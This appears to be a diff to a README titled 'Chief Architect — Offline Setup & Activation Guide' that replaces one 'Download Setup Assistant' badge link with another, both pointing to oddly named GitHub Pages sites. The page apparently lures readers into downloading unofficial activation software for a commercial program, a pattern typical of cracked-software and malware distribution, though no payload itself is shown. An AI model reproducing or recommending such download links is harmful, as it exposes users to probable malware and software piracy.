@@ -1,6 +1,6 @@
 # Chief Architect — Offline Setup & Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/chief)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://movavi-video-editor-watermark-remover.github.io/.github/)
 
 ## 🛠 How to Use
 
